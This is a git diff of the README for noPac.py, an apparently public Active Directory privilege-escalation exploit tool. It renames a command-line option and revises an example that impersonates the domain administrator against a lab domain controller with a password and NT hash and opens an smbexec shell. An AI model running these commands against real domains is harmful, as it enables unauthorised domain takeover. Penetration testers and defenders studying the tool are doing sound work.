@@ -19,11 +19,11 @@ optional arguments:
                         target username that will be impersonated (thru S4U2Self) for quering the ST. Keep in mind this will only work if the identity provided in this scripts is allowed for delegation to the SPN specified
   -domain-netbios NETBIOSNAME
                         Domain NetBIOS name. Required if the DC has multiple domains.
-  -new-name NEWNAME     Target computer name, if not specified, will be random generated.
+  -target-name NEWNAME  Target computer name, if not specified, will be random generated.
   -new-pass PASSWORD    Add new computer password, if not specified, will be random generated.
-  -old-pass PASSWORD    Target computer password, use if you know the password of the target you input with -new-name.
+  -old-pass PASSWORD    Target computer password, use if you know the password of the target you input with -target-name.
   -old-hash LMHASH:NTHASH
-                        Target computer hashes, use if you know the hash of the target you input with -new-name.
+                        Target computer hashes, use if you know the hash of the target you input with -target-name.
   -debug                Turn DEBUG output ON
   -ts                   Adds timestamp to every logging output
   -shell                Drop a shell via smbexec
@@ -44,7 +44,7 @@ authentication:
 execute options:
   -port [destination port]
                         Destination port to connect to SMB Server
-  -mode {SHARE,SERVER}  mode to use (default SHARE, SERVER needs root!)
+  -mode {SERVER,SHARE}  mode to use (default SHARE, SERVER needs root!)
   -share SHARE          share where the output will be grabbed from (default ADMIN$)
   -shell-type {cmd,powershell}
                         choose a command processor for the semi-interactive shell
@@ -104,12 +104,14 @@ AdFind.exe -sc getacls -sddlfilter ;;"[WRT PROP]";;computer;domain\user  -recmut
 ```
 ![](https://blogpics-1251691280.file.myqcloud.com/imgs/202112171448715.png)
 
-Exp: add `-no-add` and target with `-new-name`.
+Exp: add `-no-add` and target with `-target-name`.
 ```
-python noPac.py cgdomain.com/sanfeng:'1qaz@WSX' -dc-ip 10.211.55.200 -dc-host dc2008 --impersonate administrator -no-add -new-name nopactest$
+python noPac.py cgdomain.com/sanfeng:'1qaz@WSX' -dc-ip 10.211.55.200 -dc-host dc2008 --impersonate administrator -no-add -target-name DomainWin7$ -old-hash :2a99c4a3bd5d30fc94f22bf7403ceb1a -shell
 ```
 
-![](https://blogpics-1251691280.file.myqcloud.com/imgs/202112171451347.png)
+![](https://blogpics-1251691280.file.myqcloud.com/imgs/202204251528424.png)
+
+>Warning!! Do not modify the password of the computer in the domain through ldaps or samr, it may break the trust relationship between the computer and the primary domain !!
 
 ### Method 2
 Find CreateChild account, and use the account to exploit.
